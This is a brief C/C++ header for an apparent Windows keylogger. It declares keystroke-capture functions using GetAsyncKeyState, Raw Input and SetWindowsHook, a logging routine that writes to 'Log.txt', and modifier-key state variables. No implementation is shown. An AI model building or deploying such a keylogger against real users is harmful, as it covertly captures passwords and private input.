#include <stdio.h>
#include <Windows.h>

#pragma warning (disable : 4996)

extern bool capital, numLock, shift;

void KeyLogger_GetAsyncKeyState(const char fileName[]);
void KeyLogger_RawInput(const char fileName[]);
void KeyLogger_SetWindowsHook(const char fileName[]);
void Log(char* input, const char fileName[] = "Log.txt");
bool LogKey(char key);

